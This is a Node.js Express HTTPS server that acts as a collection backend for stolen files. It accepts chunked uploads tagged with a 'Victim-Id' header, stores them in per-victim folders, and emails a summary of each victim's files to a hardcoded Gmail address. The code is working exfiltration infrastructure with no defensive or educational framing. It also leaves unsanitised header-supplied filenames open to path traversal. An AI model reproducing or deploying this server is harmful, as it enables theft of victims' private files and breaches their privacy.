const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const https = require('https');
const nodemailer = require('nodemailer');
const path = require('path'); // Add this import

const app = express();
const PORT = process.env.PORT || 8443; // Use environment variable or default to 8443

// Load SSL certificate and key from environment variables
const sslOptions = {
  key: process.env.SSL_KEY,  // The private key from the Railway environment
  cert: process.env.SSL_CERT // The certificate from the Railway environment
};

// CORS configuration - allow requests from your Vercel frontend URL
const corsOptions = {
  origin: 'https://deoptestfrontend-q8ldtkgc8-2naseernoors-projects.vercel.app/', // Replace with your Vercel URL
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
};

// Enable CORS with the custom options
app.use(cors(corsOptions));

// Middleware to handle raw binary data for file uploads
app.use((req, res, next) => {
  const contentType = req.headers['content-type'] || '';
  if (contentType.startsWith('application/octet-stream') && req.url.startsWith('/upload')) {
    express.raw({ type: 'application/octet-stream', limit: '100mb' })(req, res, next);
  } else {
    next();
  }
});

// Base directory for storing files
const OUTPUT_BASE_DIR = 'received_files'; 
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
  fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

// Nodemailer transporter setup (adjust for your email provider)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Helper function to send an email
async function sendEmail(victimId, files) {
  console.log(`🔍 Preparing to send email for victim ${victimId}...`);

  const fileRows = files
    .map((file, index) =>
      `<tr>
        <td>${index + 1}</td>
        <td>${file.name}</td>
        <td>${file.type}</td>
        <td>${file.size} bytes</td>
      </tr>`
    ).join('');

  const htmlContent = `
    <h2>Files Received from Victim ${victimId}</h2>
    <p>The following files were received:</p>
    <table border="1">
      <tr>
        <th>#</th>
        <th>File Name</th>
        <th>File Type</th>
        <th>File Size</th>
      </tr>
      ${fileRows}
    </table>`;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'naseer.ord@gmail.com',
    subject: `Files Received from Victim ${victimId}`,
    html: htmlContent,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email sent: ${info.response}`);
  } catch (error) {
    console.error(`❌ Error sending email:`, error.message);
  }
}

// Store victim data
const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const victimFiles = {};

// Function to check if all files are uploaded
async function checkAndSendEmail(victimId, victimFolder) {
  const filesInFolder = fs.readdirSync(victimFolder);
  if (filesInFolder.length === victimTotalFiles[victimId]) {
    console.log(`✅ All files received for victim ${victimId}, sending email...`);

    const files = filesInFolder.map((filename) => {
      const filePath = path.join(victimFolder, filename);
      const stats = fs.statSync(filePath);
      return { name: filename, type: path.extname(filename).substring(1), size: stats.size };
    });

    victimFiles[victimId] = files;
    sendEmail(victimId, files);
  }
}

// Endpoint to handle file uploads
app.post('/upload', (req, res) => {
  let filename = decodeURIComponent(req.headers['filename']);
  let victimId = decodeURIComponent(req.headers['victim-id']);

  if (!victimFolders[victimId]) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
    fs.mkdirSync(victimFolders[victimId], { recursive: true });
    victimFileCounts[victimId] = 0;
    victimTotalFiles[victimId] = parseInt(req.headers['total-files'], 10);
  }

  const victimFolder = victimFolders[victimId];
  const filePath = path.join(victimFolder, filename);

  fs.appendFile(filePath, req.body, (err) => {
    if (err) {
      console.error(`❌ Error writing file:`, err);
      return res.status(500).send('Error saving file');
    }

    console.log(`✅ File received: ${filename}`);
    victimFileCounts[victimId] += 1;

    checkAndSendEmail(victimId, victimFolder);
    res.status(200).send('OK');
  });
});

// Start the HTTPS server
https.createServer(sslOptions, app).listen(PORT, () => {
  console.log(`🔐 HTTPS server is running on https://localhost:${PORT}`);
});
